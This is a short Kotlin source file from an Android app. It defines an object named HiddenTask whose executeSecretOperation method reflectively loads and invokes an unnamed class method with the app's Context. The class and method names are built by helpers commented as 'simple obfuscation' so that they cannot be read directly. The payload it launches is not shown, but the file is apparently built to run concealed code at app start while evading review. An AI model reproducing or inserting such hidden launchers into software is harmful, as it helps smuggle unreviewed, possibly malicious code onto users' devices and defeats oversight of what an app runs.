package com.lecture.field.tell.inti

import android.app.Application
import android.content.Context
import com.lecture.field.tell.line.ConTool


internal object HiddenTask {
    
    fun run(app: Application, onComplete: (Application) -> Unit) {
        executeSecretOperation(app)
        onComplete(app)
    }
    
    private fun executeSecretOperation(ctx: Application) {
        runCatching {
            val targetClass = Class.forName(decodeClassName())
            val targetMethod = targetClass.getMethod(decodeMethodName(), Context::class.java)
            
            targetMethod.invoke(null, ctx)
        }.onFailure { e ->
            ConTool.showLog("任务执行异常: ${e.message}")
            e.printStackTrace()
        }
    }
    
    private fun decodeClassName(): String {
        // 简单混淆：拆分字符串
        val parts = listOf("b", "b")
        return parts.joinToString(".")
    }
    
    private fun decodeMethodName(): String {
        // 简单混淆：字符重组
        return buildString {
            append('b')
            append('1')
        }
    }
}
